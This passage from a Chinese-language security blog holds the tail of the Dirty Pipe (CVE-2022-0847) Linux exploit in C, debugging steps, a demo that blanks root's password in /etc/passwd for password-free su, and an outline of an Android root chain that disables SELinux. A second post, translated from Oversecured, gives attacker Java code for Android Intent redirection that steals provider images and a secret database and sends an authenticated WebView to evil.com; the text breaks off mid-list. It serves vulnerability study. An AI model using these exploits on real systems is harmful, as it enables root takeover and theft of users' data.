st.st_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line">	<span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">	   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">	   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">	--offset;</span><br><span class="line">	<span class="type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">	   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It worked!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>环境：<a target="_blank" rel="noopener" href="https://registry.hub.docker.com/r/chenaotian/cve-2022-0847">https://registry.hub.docker.com/r/chenaotian/cve-2022-0847</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -ti --<span class="built_in">rm</span> -h cvedebug --name cvedebug --cap-add=SYS_PTRACE chenaotian/cve-2022-0847:latest /bin/bash</span><br><span class="line">docker <span class="built_in">exec</span> -it cvedebug /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/cve-2022-0847</span><br><span class="line">gcc exp.c -o exp --static &amp;&amp; <span class="built_in">cp</span> exp ./rootfs &amp;&amp; <span class="built_in">cd</span> rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="built_in">cd</span> ../ </span><br><span class="line">./boot.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote :10086</span><br><span class="line">directory /root/linux-5.13</span><br><span class="line">b do_splice</span><br><span class="line">b copy_page_to_iter_pipe </span><br><span class="line">b pipe_write</span><br><span class="line">ignore 3 15</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct pipe_inode_info *) pipe</span><br><span class="line">pwndbg&gt; p (struct pipe_buffer)pipe-&gt;bufs[0]</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  page = 0xffffea0000134cc0,</span><br><span class="line">  offset = 0,</span><br><span class="line">  len = 4096,</span><br><span class="line">  ops = 0xffffffff82019fc0 &lt;anon_pipe_buf_ops&gt;,</span><br><span class="line">  flags = 16,	==&gt; 标记</span><br><span class="line">  private = 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>编译上面的exp。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">head</span> -1 /etc/passwd <span class="comment"># 确认root受密码保护</span></span><br><span class="line"> root:x:0:0:root:/root:/usr/bin/zsh</span><br><span class="line">$ su                  <span class="comment"># 确认需要密码</span></span><br><span class="line">$ ./exp /etc/passwd 4 <span class="string">&#x27;::0:0:rootx&#x27;</span> <span class="comment"># 删除root密码保护</span></span><br><span class="line"> It worked!</span><br><span class="line">$ su                  <span class="comment"># 不需要输入密码</span></span><br></pre></td></tr></table></figure>

<h2 id="Android利用"><a href="#Android利用" class="headerlink" title="Android利用"></a>Android利用</h2><p><a target="_blank" rel="noopener" href="https://github.com/polygraphene/DirtyPipe-Android">DirtyPipe for Android</a>，这个漏洞利用复现有以下几个问题：</p>
<ul>
<li>需要编译内核源码，比较耗时间。</li>
<li>现有的pixel4 xl，Android12内核是4.14，没有到5.0以上。</li>
<li>没有pixel6的模拟器。</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
<li>在 Android 上，没有 <code>/etc/passwd</code> 和 <code>suid</code>。此外，SELinux 监控系统上的每个操作。<ul>
<li>但是利用dirtypipe可以通过任何进程读取（和覆盖）系统库（<code>/system/lib/lib*.so</code>）。</li>
<li>init 进程加载许多系统库（动态链接）。</li>
<li>init 进程可以读取（和覆盖）比 app 进程更多的文件。</li>
<li>多次使用dirtypipe来加载定制的内核模块。</li>
</ul>
</li>
</ul>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul>
<li><p>该漏洞利用包括以下阶段：</p>
<ol>
<li>钩子初始化过程。</li>
<li>重写 <code>/vendor/bin/modprobe</code> 和供应商库。</li>
<li>fork() <code>/execve()</code> 进入 <code>/vendor/bin/modprobe</code>。</li>
<li>加载内核模块以禁用 selinux。</li>
</ol>
</li>
<li><p>阶段1</p>
<ol>
<li><p>覆盖init使用的<code>/system/lib64/libc++.so</code>。</p>
<ul>
<li><p>Hook函数<code>_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev (std::__1::basic_streambuf&lt;char, std::__1::char_traits&lt;char&gt; &gt;::basic_streambuf())</code></p>
</li>
<li><p>通过运行命令<code>setprop</code>来触发该功能。</p>
</li>
</ul>
</li>
<li><p>发送下一阶段的有效载荷<code>/system/lib/libldacBT_enc.so</code>。</p>
<ul>
<li><p><code>libc++</code>空间有限。</p>
</li>
<li><p>32位的<code>libldacBT_enc.so</code>不应该频繁使用。</p>
</li>
</ul>
</li>
<li><p><code>libc++</code> 中的有效负载通过nmap加载用于 stage2 的有效负载<code>libldacBT_enc.so</code>。</p>
</li>
</ol>
</li>
<li><p>阶段2</p>
<ol>
<li>现在位于init进程中。</li>
<li>用 <code>modprobe-payload</code>覆盖<code>/vendor/bin/modprobe</code>。<ul>
<li>modprobe 有权加载内核模块。</li>
</ul>
</li>
<li>用内核模块 (mymod.ko) 的内容覆盖<code>/vendor/lib/libstagefright_soft_mp3dec.so</code>。<ul>
<li>modprobe 可以从 vendor_file 上下文加载内核模块。</li>
<li>之所以选择这个库，是因为它在 offset&#x3D;4096 处与 mymod.ko 具有相同的内容，并且无法被dirtypipe 覆盖。</li>
</ul>
</li>
<li>转换到<code>vendor_modprobe</code>上下文然后 <code>fork()/execve(/vendor/bin/modprobe)</code>。</li>
</ol>
</li>
<li><p>vendor_modprobe (modprobe-payload)</p>
<ol>
<li>打开（<code>/vendor/lib/libstagefright_soft_mp3dec.so</code>）<ul>
<li>文件内容被替换为 mymod.ko</li>
</ul>
</li>
<li>finit_module(mymod.ko)<ul>
<li>mymod.ko 将调用进程的 selinux 域设置为允许。</li>
</ul>
</li>
<li>运行<code>startup-root</code>脚本<ul>
<li>获取root。</li>
</ul>
</li>
</ol>
</li>
</ul>
<h4 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sesearch --allow policy-dump|grep module_load</span><br><span class="line">allow init-insmod-sh vendor_kernel_modules:system module_load;</span><br><span class="line">allow ueventd vendor_file:system module_load;</span><br><span class="line">allow vendor_modprobe vendor_file:system module_load;</span><br><span class="line"></span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:system_lib_file:s0     43168 2009-01-01 09:00 /system/lib/libldacBT_enc.so</span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:system_lib_file:s0     700392 2009-01-01 09:00 /system/lib64/libc++.so</span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:vendor_file:s0         71068 2009-01-01 09:00 /vendor/lib/libstagefright_soft_mp3dec.so</span><br><span class="line">lrwxr-xr-x 1 root shell u:object_r:vendor_file:s0             7 2009-01-01 09:00 /vendor/bin/modprobe -&gt; toolbox</span><br></pre></td></tr></table></figure>

<ul>
<li><code>finit_module</code>可以加载<code>vendor_kernel_modules</code>或<code>vendor_file</code>。adb shell 或非系统应用程序都无法读取两者。所以内核模块必须由其他 selinux 上下文准备。<code>init</code>上下文可用于此（stage1 有效负载）。</li>
<li>init-insmod-sh 和 ueventd 也应该可用于此技术。（未实施&#x2F;测试）</li>
</ul>
<h4 id="添加对设备的支持"><a href="#添加对设备的支持" class="headerlink" title="添加对设备的支持"></a>添加对设备的支持</h4><ul>
<li>libc++.so 中的函数偏移量。</li>
<li>libc++.so 中的empty空间大小。</li>
<li><code>/vendor/bin/modprobe</code>可用性。</li>
<li><code>/vendor/lib/libstagefright_soft_mp3dec.so</code>可用性。<ul>
<li>必须与 mymod.ko 的内容匹配。</li>
</ul>
</li>
<li>为特定设备构建内核模块。</li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-01-21T13:59:26.000Z" title="2022/1/21 21:59:26">2022-01-21</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-01-23T11:23:11.065Z" title="2022/1/23 19:23:11">2022-01-23</time></span><span class="level-item">14 minutes read (About 2093 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/01/21/Android-Intent-%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E/">Android Intent 重定向漏洞</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.oversecured.com/Android-Access-to-app-protected-components/">https://blog.oversecured.com/Android-Access-to-app-protected-components/</a></p>
</blockquote>
<p>由于Intent类是Parcelable，属于这个类的对象可以作为额外的数据传递到另一个Intent对象中。许多开发者利用这一特性，创建了代理组件（活动、广播接收器和服务），这些代理组件采取嵌入式Intent，并将其传递给危险的方法，如startActivity(…), sendBroadcast(…)等。攻击者可以强迫应用程序启动一个不能从其他应用程序直接启动的非导出组件，或者让攻击者访问其内容提供者。WebView有时也会使用Intent.parseUri(…)方法，将URL从字符串变为Intent对象，并将其传递给startActivity(…)。</p>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>如下的AndroidManifest.xml所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.ProxyActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.AuthWebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>Activity <code>ProxyActivity</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startActivity((Intent) getIntent().getParcelableExtra(<span class="string">&quot;extra_intent&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>Activity <code>AuthWebViewActivity</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>), getAuthHeaders());</span><br></pre></td></tr></table></figure>

<p><code>AuthWebViewActivity</code>是执行某些不安全操作的隐藏应用程序功能的示例，在这种情况下，将用户的身份验证会话传递给从<code>url</code>参数获取的 URL。</p>
<p>出口限制意味着攻击者无法直接访问<code>AuthWebViewActivity</code>。如果直接调用<code>AuthWebViewActivity</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.AuthWebViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>

<p>抛出一个<code>java.lang.SecurityException</code>，由于<code>Permission Denial</code>: <code>AuthWebViewActivity not exported from uid 1337</code>。</p>
<p>但攻击者可以通过<code>ProxyActivity</code>启动<code>AuthWebViewActivity</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">extra.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.AuthWebViewActivity&quot;</span>);</span><br><span class="line">extra.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ProxyActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;extra_intent&quot;</span>, extra);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>

<p>并且不会出现安全违规，因为受到攻击的应用程序确实可以访问它自己的所有组件。使用此代码片段，攻击者可以绕过 Android 系统的内置限制。</p>
<h1 id="攻击升级"><a href="#攻击升级" class="headerlink" title="攻击升级"></a>攻击升级</h1><h2 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h2><p>除了访问原始应用程序的任意组件外，攻击者还可以尝试访问满足以下条件的应用程序的Content Provider：</p>
<ul>
<li>它必须是非导出的（否则它可能会被直接攻击）</li>
<li>它必须将<code>android:grantUriPermissions</code>标志设置为<code>true</code>.</li>
</ul>
<p>攻击者必须将自己设置为嵌入式intent的接收者并设置以下标志</p>
<ul>
<li><code>Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</code> ，允许对Provider的持久访问（没有这个标志，访问是一次性的）</li>
<li><code>Intent.FLAG_GRANT_PREFIX_URI_PERMISSION</code>，允许通过前缀进行 URI 访问——例如访问<code>content://com.victim.provider/image/1</code>，攻击者可以使用 URI 授予对所有提供者内容（<code>content://com.victim.provider/</code>）的访问权限，然后使用<code>ContentResolver</code>来寻找<code>content://com.victim.provider/image/1</code>、<code>content://com.victim.provider/image/2</code>等等，而不是使用完整路径重复获得单独的访问权限。</li>
<li><code>Intent.FLAG_GRANT_READ_URI_PERMISSION</code>，允许对提供程序进行读取操作（例如<code>query</code>, <code>openFile</code>, <code>openAssetFile</code>）</li>
<li><code>Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code> ，允许写操作</li>
</ul>
<p>一个典型的Provider的例子，攻击者可以访问它并执行常规操作，如<code>query</code>, <code>update</code>, <code>insert</code>, <code>delete</code>, <code>openFile</code>,<code>openAssetFile</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;com.victim.ContentProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.victim.provider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>盗取用户图片文件示例，<code>AndroidManifest.xml</code>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.LeakActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>MainActivity.java</code> 文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span><br><span class="line">        | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION</span><br><span class="line">        | Intent.FLAG_GRANT_READ_URI_PERMISSION</span><br><span class="line">        | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line">extra.setClassName(getPackageName(), <span class="string">&quot;com.attacker.LeakActivity&quot;</span>);</span><br><span class="line">extra.setData(Uri.parse(<span class="string">&quot;content://com.victim.provider/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ProxyActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;extra_intent&quot;</span>, extra);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>

<p><code>LeakActivity.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(getIntent().getDataString() + <span class="string">&quot;image/1&quot;</span>)); <span class="comment">// content://com.victim.provider/image/1</span></span><br><span class="line"><span class="type">Bitmap</span> <span class="variable">bitmap</span> <span class="operator">=</span> BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); <span class="comment">// stolen image</span></span><br></pre></td></tr></table></figure>

<h2 id="File-Provider"><a href="#File-Provider" class="headerlink" title="File Provider"></a>File Provider</h2><p>此漏洞使攻击者有可能窃取位于开发人员预定目录中的应用程序文件。为了成功攻击，恶意应用需要获得对 Android File Provider 的访问权限，然后使用 Android ContentResolver 从File Provider中读取内容。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.victim.files_provider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/provider_paths&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>它提供对可以在应用程序资源中找到的特殊列表中的文件的读&#x2F;写访问权限，在本例中位于 <code>res/xml/provider_paths.xml</code></p>
<p>它可能看起来有点像</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">files-path</span> <span class="attr">name</span>=<span class="string">&quot;internal_files&quot;</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cache-path</span> <span class="attr">name</span>=<span class="string">&quot;cache&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">external-path</span> <span class="attr">name</span>=<span class="string">&quot;external_files&quot;</span> <span class="attr">path</span>=<span class="string">&quot;images&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>每个标签指定一个根目录，其<code>path</code>值相对于根目录。例如，该值<code>external_files</code>将对应于<code>new File(Environment.getExternalStorageDirectory(), &quot;images&quot;)</code></p>
<p>该值<code>root-path</code>对应于<code>/</code>，即提供对任意文件的访问。</p>
<p>假设我们在文件中存储了一些秘密数据<code>/data/data/com.victim/databases/secret.db</code>：该文件的窃取可能看起来像这样 <code>MainActivity.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br><span class="line">extra.setClassName(getPackageName(), <span class="string">&quot;com.attacker.LeakActivity&quot;</span>);</span><br><span class="line">extra.setData(Uri.parse(<span class="string">&quot;content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ProxyActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;extra_intent&quot;</span>, extra);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>

<p><code>LeakActivity.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">i</span> <span class="operator">=</span> getContentResolver().openInputStream(getIntent().getData()); <span class="comment">// we can now do whatever we like with this stream, e.g. send it to a remote server</span></span><br></pre></td></tr></table></figure>

<h2 id="Webview"><a href="#Webview" class="headerlink" title="Webview"></a>Webview</h2><p>一个 Intent 对象可以通过<code>Intent.toUri(flags)</code>被转换为一个字符串，然后使用<code>Intent.parseUri(stringUri, flags)</code>再转换为Intent。此功能通常用于 WebView（应用程序的内置浏览器）：应用程序可以验证<code>intent://</code>方案，将 URL 解析为 Intent 并启动活动。</p>
<p>可以通过客户端应用程序中的其他漏洞（例如，直接通过导出的活动或通过deeplink机制在 WebView 中打开应用程序内任意链接的能力）和远程利用此漏洞，包括服务器上的跨站脚本攻击或客户端上的中间人攻击。</p>
<p>易受攻击的代码示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> request.getUrl();</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;intent&quot;</span>.equals(uri.getScheme())) &#123;</span><br><span class="line">        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的重点是，<code>WebViewClient</code>类的<code>shouldOverrideUrlLoading(...)</code>方法在每次WebView试图加载一个新的链接时被调用，但给应用程序提供了添加自定义处理程序的选择。</p>
<p>要利用此漏洞，攻击者需要创建一个 WebView 重定向到一个专门准备的intent-scheme URL。URL 创建示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.AuthWebViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;evil&quot;</span>, intent.toUri(Intent.URI_INTENT_SCHEME)); <span class="comment">// outputs &quot;intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span></span><br></pre></td></tr></table></figure>

<p>示例攻击：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">&quot;intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>与漏洞的经典版本相比，该版本包含几个限制：</p>
<ul>
